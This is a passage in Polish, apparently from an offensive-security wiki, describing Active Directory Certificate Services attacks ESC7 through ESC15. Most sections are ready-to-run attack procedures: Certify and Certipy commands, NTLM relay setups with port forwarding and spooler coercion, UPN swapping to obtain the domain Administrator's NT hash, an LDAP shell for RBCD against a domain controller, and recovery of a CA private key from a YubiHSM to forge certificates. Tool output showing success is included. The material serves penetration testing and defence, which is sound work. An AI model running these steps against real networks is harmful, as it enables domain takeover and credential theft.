Ponieważ docelowy szablon **nie definiuje wartości domyślnej dla tego rozszerzenia**, CA NIE nadpisze wartości kontrolowanej przez atakującego, gdy żądanie zostanie ostatecznie wystawione. Wystawiony certyfikat będzie więc zawierał wybrane przez atakującego rozszerzenie, które może:

* Spełnić wymagania Application / Issuance Policy innych podatnych szablonów (prowadząc do eskalacji uprawnień).
* Wstrzyknąć dodatkowe EKU lub zasady, które zapewnią certyfikatowi nieoczekiwany poziom zaufania w systemach innych firm.

Krótko mówiąc, *Manage Certificates* — wcześniej uznawane za „mniej potężną” część ESC7 — można teraz wykorzystać do pełnej eskalacji uprawnień lub długotrwałego utrzymania dostępu, bez modyfikowania konfiguracji CA ani wymagania bardziej restrykcyjnego uprawnienia *Manage CA*.

#### Wykorzystanie tej możliwości za pomocą Certify 2.0

1. **Wyślij żądanie certyfikatu, które pozostanie *oczekujące*.** Można to wymusić za pomocą szablonu wymagającego zatwierdzenia przez menedżera:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Dołącz niestandardowe rozszerzenie do oczekującego żądania** za pomocą nowego polecenia `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Jeśli szablon nie definiuje już rozszerzenia *Zasady wystawiania certyfikatów*, powyższa wartość zostanie zachowana po wystawieniu certyfikatu.*

3. **Wystaw żądanie** (jeśli Twoja rola ma również uprawnienia zatwierdzania *Zarządzania certyfikatami*) lub poczekaj, aż operator je zatwierdzi. Po wystawieniu pobierz certyfikat:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Wynikowy certyfikat zawiera teraz złośliwy OID polityki wystawiania i może zostać użyty w kolejnych atakach (np. ESC13, eskalacja uprawnień w domenie itd.).

> UWAGA: Ten sam atak można przeprowadzić za pomocą Certipy ≥ 4.7, używając polecenia `ca` i parametru `-set-extension`.

## NTLM Relay do endpointów HTTP AD CS – ESC8

### Wyjaśnienie

> [!TIP]
> W środowiskach, w których **zainstalowano AD CS**, jeśli istnieje **podatny endpoint rejestracji internetowej** i opublikowano co najmniej jeden **szablon certyfikatu**, który zezwala na **rejestrację komputerów domenowych i uwierzytelnianie klienta** (np. domyślny szablon **`Machine`**), atakujący może przejąć **dowolny komputer z aktywną usługą spooler**!

AD CS obsługuje kilka **metod rejestracji opartych na HTTP**, udostępnianych za pośrednictwem dodatkowych ról serwera, które administratorzy mogą zainstalować. Te interfejsy rejestracji certyfikatów przez HTTP są podatne na **ataki NTLM Relay**. Atakujący, działając z **przejętej maszyny, może podszyć się pod dowolne konto AD, które uwierzytelnia się przez przychodzące NTLM**. Podszywając się pod konto ofiary, atakujący może uzyskać dostęp do tych interfejsów internetowych i **zażądać certyfikatu uwierzytelniania klienta z użyciem szablonu certyfikatu `User` lub `Machine`**.

- **Interfejs rejestracji internetowej** (starsza aplikacja ASP dostępna pod adresem `http://<caserver>/certsrv/`) domyślnie korzysta wyłącznie z HTTP, które nie zapewnia ochrony przed atakami NTLM Relay. Ponadto jawnie dopuszcza wyłącznie uwierzytelnianie NTLM za pośrednictwem nagłówka HTTP Authorization, przez co bezpieczniejsze metody uwierzytelniania, takie jak Kerberos, nie mają zastosowania.
- Usługi sieci Web **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) oraz **Network Device Enrollment Service** (NDES) domyślnie obsługują uwierzytelnianie Negotiate za pośrednictwem nagłówka HTTP Authorization. Uwierzytelnianie Negotiate **obsługuje zarówno** Kerberos, jak i **NTLM**, co pozwala atakującemu **wymusić użycie NTLM** podczas ataków Relay. Chociaż te usługi sieci Web domyślnie korzystają z HTTPS, samo HTTPS **nie chroni przed atakami NTLM Relay**. Ochrona usług HTTPS przed atakami NTLM Relay jest możliwa tylko wtedy, gdy HTTPS jest połączone z channel binding. Niestety, AD CS nie włącza Extended Protection for Authentication w IIS, co jest wymagane do channel binding.<sup>[[6]](#references)</sup>

Częstym **problemem** w atakach NTLM Relay jest **krótki czas trwania sesji NTLM** oraz brak możliwości interakcji atakującego z usługami, które **wymagają podpisywania NTLM**.

To ograniczenie można jednak przezwyciężyć, wykorzystując atak NTLM Relay do uzyskania certyfikatu dla użytkownika, ponieważ czas trwania sesji wyznacza okres ważności certyfikatu, a certyfikatu można używać z usługami, które **wymagają podpisywania NTLM**. Instrukcje dotyczące użycia skradzionego certyfikatu znajdują się tutaj:


{{#ref}}
account-persistence.md
{{#endref}}

Kolejnym ograniczeniem ataków NTLM Relay jest to, że **konto ofiary musi uwierzytelnić się na maszynie kontrolowanej przez atakującego**. Atakujący może poczekać lub spróbować **wymusić** takie uwierzytelnienie:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Wykorzystanie**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` wylicza **aktywne endpointy HTTP AD CS**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Właściwość `msPKI-Enrollment-Servers` jest używana przez enterprise Certificate Authorities (CA) do przechowywania endpointów Certificate Enrollment Service (CES). Te endpointy można analizować i wyświetlać za pomocą narzędzia **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Nadużycie przy użyciu Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Nadużycie z użyciem [Certipy](https://github.com/ly4k/Certipy)

Certipy domyślnie składa żądanie certyfikatu na podstawie szablonu `Machine` lub `User`, zależnie od tego, czy nazwa relacjonowanego konta kończy się znakiem `$`. Inny szablon można wskazać za pomocą parametru `-template`.

Następnie można użyć techniki takiej jak [PetitPotam](https://github.com/ly4k/PetitPotam), aby wymusić uwierzytelnienie. W przypadku kontrolerów domeny wymagane jest wskazanie `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Brak rozszerzenia zabezpieczeń - ESC9 <a href="#id-5485" id="id-5485"></a>

### Wyjaśnienie

Wartość **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) ustawiona dla **`msPKI-Enrollment-Flag`**, określana jako ESC9, pomija rozszerzenie SID `szOID_NTDS_CA_SECURITY_EXT` w certyfikacie. Starsze przykłady ESC9 opierają się na mechanizmie zgodności KDC (`StrongCertificateBindingEnforcement=1`) lub na odrębnej ścieżce mapowania Schannel o słabych zabezpieczeniach. Wartość `1` to **historyczne ustawienie zgodności**, a nie bieżąca wartość domyślna: Microsoft informuje, że zastępowanie ustawień KDC przestało być obsługiwane po aktualizacji zabezpieczeń systemu Windows z 9 września 2025 r. Przed zastosowaniem starszego przepisu sprawdź rzeczywistą aktualizację systemu oraz używany punkt końcowy uwierzytelniania.<sup>[[7]](#references)</sup> Zobacz [wskazówki Microsoft dotyczące wdrażania](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Warunki, w których to ustawienie flagi nabiera znaczenia, obejmują:

- Na starszym, zgodnym KDC efektywna zasada wiązania certyfikatów zezwala na mapowanie; alternatywnie punkt końcowy Schannel osobno włącza mapowanie UPN za pomocą bitu `0x4` ustawienia `CertificateMappingMethods`.
- Certyfikat ma ustawioną flagę `CT_FLAG_NO_SECURITY_EXTENSION` w ramach ustawienia `msPKI-Enrollment-Flag`.
- Certyfikat zawiera dowolny EKU uwierzytelniania klienta.
- Dostępne są uprawnienia `GenericWrite` do dowolnego konta, aby przejąć inne konto.

### Scenariusz nadużycia

Załóżmy, że `John@corp.local` ma uprawnienia `GenericWrite` do `Jane@corp.local`, a celem jest przejęcie `Administrator@corp.local`. Szablon certyfikatu `ESC9`, do którego rejestrowania uprawniona jest `Jane@corp.local`, ma ustawioną flagę `CT_FLAG_NO_SECURITY_EXTENSION` w ramach ustawienia `msPKI-Enrollment-Flag`.

Najpierw pozyskuje się hash `Jane` za pomocą Shadow Credentials, korzystając z uprawnień `GenericWrite` użytkownika `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Następnie `userPrincipalName` użytkownika `Jane` zostaje zmieniony na `Administrator`, celowo z pominięciem części domeny `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Ta modyfikacja nie narusza ograniczeń, ponieważ `Administrator@corp.local` nadal pozostaje odrębną wartością `userPrincipalName` użytkownika `Administrator`.

Następnie żąda się certyfikatu z podatnego szablonu `ESC9` jako `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Zauważono, że `userPrincipalName` certyfikatu odzwierciedla `Administrator`, bez żadnego „object SID”.

`userPrincipalName` użytkowniczki `Jane` zostaje następnie przywrócone do pierwotnej wartości: `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Próba uwierzytelnienia za pomocą wydanego certyfikatu zwraca teraz hash NT użytkownika `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>` ze względu na brak określenia domeny w certyfikacie:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Słabe mapowania certyfikatów - ESC10

### Wyjaśnienie

W ramach ESC10 często omawia się dwie odrębne zasady mapowania certyfikatów. Odczytaj ustawienie na punkcie końcowym, który obsługuje dane uwierzytelnianie:

- `CertificateMappingMethods` Schannel w `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` kontroluje mapowanie certyfikatów klienta TLS na serwerze aplikacji. Bit UPN to `0x4`; na zaktualizowanych systemach wartością domyślną jest `0x18` (`0x8 | 0x10`).
- `StrongCertificateBindingEnforcement` KDC w `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` historycznie kontrolowało zgodność powiązań certyfikatów Kerberos. Wartość `1` nie jest wiarygodną bieżącą wartością domyślną, a Microsoft zakończył obsługę tego nadpisania wraz z aktualizacją zabezpieczeń systemu Windows z 9 września 2025 r. Jego stan sam w sobie nie określa mapowania UPN w Schannel.<sup>[[7]](#references)</sup>

**Przypadek 1**

Historycznie, gdy starszy KDC uwzględniał `StrongCertificateBindingEnforcement=0`; zweryfikuj poziom aktualizacji, ponieważ to nadpisanie nie jest już obsługiwane w aktualnie załatanych systemach.

**Przypadek 2**

Gdy w punkcie końcowym Schannel obsługującym certyfikaty klienta włączony jest bit UPN (`0x4`) ustawienia `CertificateMappingMethods`. Jest to ustawienie odrębne od wymuszania silnego powiązania przez KDC; nadal wymagany jest certyfikat uwierzytelniania klienta, który można zarejestrować, oraz skuteczna kontrola nad mapowanym atrybutem konta.

### Przypadek nadużycia 1

We wdrożeniu, w którym KDC nadal uwzględnia `StrongCertificateBindingEnforcement=0`, kontrola nad `userPrincipalName` konta może stanowić element ścieżki słabego mapowania prowadzącej do innego konta. Wymagane rejestrowanie certyfikatu, mapowanie, tożsamość docelowa i pomyślne uwierzytelnienie muszą być weryfikowane oddzielnie; sam wpis ACE `GenericWrite` lub wartość rejestru nie oznacza przejęcia konta.

Na przykład, mając uprawnienia `GenericWrite` do `Jane@corp.local`, atakujący dąży do przejęcia konta `Administrator@corp.local`. Procedura jest podobna do ESC9 i pozwala użyć dowolnego szablonu certyfikatu.

Najpierw hash `Jane` jest pobierany za pomocą Shadow Credentials, wykorzystując uprawnienie `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Następnie wartość `userPrincipalName` użytkownika `Jane` zostaje zmieniona na `Administrator`, celowo z pominięciem części `@corp.local`, aby uniknąć naruszenia ograniczeń.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Następnie jako `Jane` żądany jest certyfikat umożliwiający uwierzytelnianie klienta, przy użyciu domyślnego szablonu `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` użytkowniczki `Jane` zostaje następnie przywrócone do pierwotnej wartości `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Uwierzytelnienie za pomocą uzyskanego certyfikatu pozwoli uzyskać hash NT konta `Administrator@corp.local`. W poleceniu trzeba podać domenę, ponieważ certyfikat nie zawiera informacji o domenie.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Przypadek nadużycia 2

Gdy `CertificateMappingMethods` zawiera flagę bitową `UPN` (`0x4`), konto A z uprawnieniami `GenericWrite` może przejąć dowolne konto B, które nie ma właściwości `userPrincipalName`, w tym konta maszyn oraz wbudowane konto administratora domeny `Administrator`.

Celem jest tutaj przejęcie `DC$@corp.local`, zaczynając od uzyskania hasha `Jane` za pomocą Shadow Credentials, wykorzystując uprawnienia `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

Następnie `userPrincipalName` użytkownika `Jane` zostaje ustawiony na `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Certyfikat do uwierzytelniania klienta jest żądany jako `Jane` przy użyciu domyślnego szablonu `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` użytkownika `Jane` zostaje przywrócony do pierwotnej wartości po tym procesie.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Do uwierzytelniania przez Schannel używana jest opcja Certipy `-ldap-shell`, co wskazuje na pomyślne uwierzytelnienie jako `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Za pomocą powłoki LDAP polecenia takie jak `set_rbcd` umożliwiają przeprowadzanie ataków z wykorzystaniem delegowania ograniczonego opartego na zasobach (RBCD), co może doprowadzić do przejęcia kontrolera domeny.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Ta podatność obejmuje również każde konto użytkownika, które nie ma atrybutu `userPrincipalName` lub którego wartość nie jest zgodna z `sAMAccountName`. Domyślne konto `Administrator@corp.local` jest szczególnie atrakcyjnym celem ze względu na podwyższone uprawnienia LDAP i brak atrybutu `userPrincipalName` w konfiguracji domyślnej.

## Przekazywanie NTLM do ICPR — ESC11

### Wyjaśnienie

Jeśli serwer CA nie jest skonfigurowany z flagą `IF_ENFORCEENCRYPTICERTREQUEST`, możliwe są ataki NTLM relay bez podpisywania za pośrednictwem usługi RPC. [Tutaj znajdziesz źródło](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Możesz użyć `certipy`, aby sprawdzić, czy opcja `Enforce Encryption for Requests` jest wyłączona. Certipy wyświetli wtedy podatności `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Scenariusz nadużycia

Należy skonfigurować serwer relay:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Uwaga: W przypadku kontrolerów domeny musimy określić `-template` w DomainController.

Lub użyć [forka impacket autorstwa sploutchy](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Dostęp do powłoki ADCS CA z YubiHSM - ESC12

### Wyjaśnienie

Administratorzy mogą skonfigurować urząd certyfikacji tak, aby przechowywał klucz na urządzeniu zewnętrznym, takim jak „Yubico YubiHSM2”.

Jeśli urządzenie USB jest podłączone do serwera CA przez port USB lub przez serwer urządzeń USB, gdy serwer CA jest maszyną wirtualną, wymagany jest klucz uwierzytelniający (czasami nazywany „hasłem”), aby Key Storage Provider mógł generować klucze w YubiHSM i z nich korzystać.

Ten klucz/hasło jest przechowywany w rejestrze w postaci jawnego tekstu pod ścieżką `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Źródło: [tutaj](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenariusz nadużycia

Jeśli klucz prywatny CA jest przechowywany na fizycznym urządzeniu USB, po uzyskaniu dostępu do powłoki można go odzyskać.

Najpierw należy uzyskać certyfikat CA (jest publiczny), a następnie:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Na koniec użyj polecenia certutil `-sign`, aby sfałszować nowy, dowolny certyfikat przy użyciu certyfikatu CA i jego klucza prywatnego.

## OID Group Link Abuse - ESC13

### Wyjaśnienie

Atrybut `msPKI-Certificate-Policy` umożliwia dodanie zasad wydawania do szablonu certyfikatu. Obiekty `msPKI-Enterprise-Oid`, odpowiedzialne za wydawanie zasad, można znaleźć w kontekście nazewnictwa Configuration (CN=OID,CN=Public Key Services,CN=Services) kontenera PKI OID. Zasadę można powiązać z grupą AD za pomocą atrybutu `msDS-OIDToGroupLink` tego obiektu, co umożliwia systemowi autoryzację użytkownika przedstawiającego certyfikat tak, jakby należał do tej grupy. [Odwołanie tutaj](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Innymi słowy, gdy użytkownik ma uprawnienia do rejestrowania certyfikatu, a certyfikat jest powiązany z grupą OID, może uzyskać uprawnienia tej grupy.

Użyj [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), aby znaleźć OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Scenariusz nadużycia

Znajdź użytkownika z uprawnieniem do rejestracji, używając `certipy find` lub `Certify.exe find /showAllPermissions`.

Jeśli `John` ma uprawnienie do rejestracji w `VulnerableTemplate`, może odziedziczyć uprawnienia grupy `VulnerableGroup`.

Wystarczy, że wskaże szablon — otrzyma certyfikat z uprawnieniami OIDToGroupLink.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Nadużycie jawnego mapowania certyfikatów — ESC14

### Wyjaśnienie

Opis pod adresem https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping jest wyjątkowo szczegółowy. Poniżej przytoczono oryginalny tekst.<sup>[[14]](#references)</sup>

ESC14 dotyczy luk wynikających ze „słabego jawnego mapowania certyfikatów”, głównie z niewłaściwego użycia lub niebezpiecznej konfiguracji atrybutu `altSecurityIdentities` na kontach użytkowników lub komputerów w Active Directory. Ten wielowartościowy atrybut pozwala administratorom ręcznie powiązać certyfikaty X.509 z kontem AD na potrzeby uwierzytelniania. Po skonfigurowaniu takie jawne mapowania mogą zastąpić domyślną logikę mapowania certyfikatów, która zazwyczaj opiera się na UPN-ach lub nazwach DNS w polu SAN certyfikatu albo na identyfikatorze SID osadzonym w rozszerzeniu zabezpieczeń `szOID_NTDS_CA_SECURITY_EXT`.

Mapowanie jest „słabe”, gdy wartość ciągu znaków użyta w atrybucie `altSecurityIdentities` do identyfikacji certyfikatu jest zbyt ogólna, łatwa do odgadnięcia, opiera się na nieunikatowych polach certyfikatu lub wykorzystuje łatwe do sfałszowania elementy certyfikatu. Jeśli atakujący może uzyskać lub utworzyć certyfikat, którego atrybuty pasują do tak zdefiniowanego słabego mapowania jawnego dla uprzywilejowanego konta, może użyć tego certyfikatu do uwierzytelnienia się jako to konto i podszywania się pod nie.

Przykłady potencjalnie słabych ciągów mapowania `altSecurityIdentities`:

- Mapowanie wyłącznie na podstawie powszechnej nazwy CN w polu Subject, np. `X509:<S>CN=SomeUser`. Atakujący może być w stanie uzyskać certyfikat z tą nazwą CN z mniej bezpiecznego źródła.
- Użycie zbyt ogólnych nazw wyróżniających Issuer (DN) lub Subject DN bez dodatkowego ograniczenia, takiego jak konkretny numer seryjny lub identyfikator klucza podmiotu, np. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Zastosowanie innych przewidywalnych wzorców lub identyfikatorów nieopartych na kryptografii, które atakujący może umieścić w certyfikacie, jaki może legalnie uzyskać lub sfałszować (jeśli przejął urząd certyfikacji lub znalazł podatny szablon, taki jak w ESC1).

Atrybut `altSecurityIdentities` obsługuje różne formaty mapowania, takie jak:

- `X509:<I>IssuerDN<S>SubjectDN` (mapowanie na podstawie pełnych nazw DN wystawcy i podmiotu)
- `X509:<SKI>SubjectKeyIdentifier` (mapowanie na podstawie wartości rozszerzenia Subject Key Identifier certyfikatu)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapowanie na podstawie numeru seryjnego, z niejawnym uwzględnieniem DN wystawcy) — nie jest to standardowy format; zwykle stosuje się `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapowanie na podstawie nazwy RFC822, zwykle adresu e-mail, z pola SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapowanie na podstawie skrótu SHA1 nieprzetworzonego klucza publicznego certyfikatu — zazwyczaj silne)

Bezpieczeństwo tych mapowań zależy od użytych w nich identyfikatorów. Microsoft klasyfikuje mapowania oparte na adresach e-mail lub nazwach podmiotu, w tym `X509:<RFC822>`, jako **słabe**. W trybie Full Enforcement certyfikat bez silnego mapowania jest odrzucany; aktualizacja zabezpieczeń systemu Windows z września 2025 r. usunęła możliwość powrotu do trybu Compatibility. Samo słabe mapowanie nie jest więc obecnie niezawodną metodą podszywania się pod użytkownika. Przed oceną scenariusza ze słabym mapowaniem sprawdź rzeczywisty poziom poprawek kontrolera domeny i sposób obsługi mapowania certyfikatów. Możliwość zapisu do `altSecurityIdentities` to osobny trop: atakujący dysponujący odpowiednim zaufanym certyfikatem może być w stanie dodać **silne** mapowanie jawne, z uwzględnieniem efektywnych uprawnień i walidacji certyfikatu. Zobacz [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) oraz [badania ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Należy również diagnozować błędy uwierzytelniania certyfikatem: wyłączone konto docelowe lub wygasłe hasło mogą uniemożliwić logowanie, nawet gdy sam certyfikat pozostaje ważny.

### Scenariusz nadużycia

ESC14 dotyczy **jawnych mapowań certyfikatów** w Active Directory (AD), a konkretnie atrybutu `altSecurityIdentities`. Jeśli ten atrybut jest skonfigurowany (celowo lub wskutek błędnej konfiguracji), atakujący mogą podszywać się pod konta, przedstawiając certyfikaty zgodne z mapowaniem.

#### Scenariusz A: Atakujący może zapisywać do `altSecurityIdentities`

 **Warunek wstępny**: Atakujący ma uprawnienia do zapisu atrybutu `altSecurityIdentities` konta docelowego lub uprawnienia do ich nadania w postaci jednego z poniższych uprawnień do obiektu docelowego w AD:  
- Zapis właściwości `altSecurityIdentities`  
- Zapis właściwości `Public-Information`  
- Zapis właściwości (wszystkich)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Właściciel*.
#### Scenariusz B: Cel ma słabe mapowanie X509RFC822 (adres e-mail)

- **Historyczny/warunkowy warunek wstępny**: Cel ma słabe mapowanie X509RFC822 w `altSecurityIdentities`, atakujący może edytować atrybut `mail` podmiotu rejestrującego certyfikat, a odpowiedni szablon umieszcza ten adres e-mail w certyfikacie uwierzytelniania klienta bez kolidującego powiązania SID. Uwierzytelnienie wymaga również środowiska, które nadal akceptuje słabe mapowanie; tryb Full Enforcement odrzuca mapowania certyfikatów oparte wyłącznie na słabym mapowaniu. Sam zapis do atrybutu `mail` to jedynie trop.
#### Scenariusz C: Cel ma mapowanie X509IssuerSubject

- **Warunek wstępny**: Cel ma słabe jawne mapowanie X509IssuerSubject w `altSecurityIdentities`. Atakujący może ustawić atrybut `cn` lub `dNSHostName` na podmiocie ofiary tak, aby odpowiadał tematowi mapowania X509IssuerSubject celu. Następnie atakujący może uzyskać certyfikat jako ofiara i użyć go do uwierzytelnienia się jako cel.
#### Scenariusz D: Cel ma mapowanie X509SubjectOnly

- **Warunek wstępny**: Cel ma słabe jawne mapowanie X509SubjectOnly w `altSecurityIdentities`. Atakujący może ustawić atrybut `cn` lub `dNSHostName` na podmiocie ofiary tak, aby odpowiadał tematowi mapowania X509SubjectOnly celu. Następnie atakujący może uzyskać certyfikat jako ofiara i użyć go do uwierzytelnienia się jako cel.
### konkretne działania
#### Scenariusz A

Zażądaj certyfikatu z szablonu certyfikatu `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Zapisz i przekonwertuj certyfikat

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Uwierzytelnij się (przy użyciu certyfikatu)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Czyszczenie (opcjonalne)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

W przypadku bardziej szczegółowych metod ataku w różnych scenariuszach zapoznaj się z: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Wyjaśnienie

[Oryginalny artykuł o ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) wyjaśnia, jak zasady aplikacji przekazane w żądaniu dotyczącym szablonu V1 mogą zastąpić skonfigurowane Extended Key Usage na **niezałatanej CA wystawiającej certyfikaty**.<sup>[[15]](#references)</sup> Potrzebny jest również opublikowany szablon, na który można się zapisać, który dopuszcza wymagane właściwości podmiotu/żądania i nie wymaga blokującego zatwierdzenia ani podpisu. Same uprawnienia do zapisu nie potwierdzają możliwości wykorzystania podatności. Użycie Certificate Request Agent może dodatkowo zależeć od odpowiedniego drugiego szablonu i ograniczeń dotyczących agentów rejestracji; przed stwierdzeniem, że ta ścieżka jest możliwa, sprawdź stan poprawek CA oraz wynik wystawienia certyfikatu.

### Nadużycie

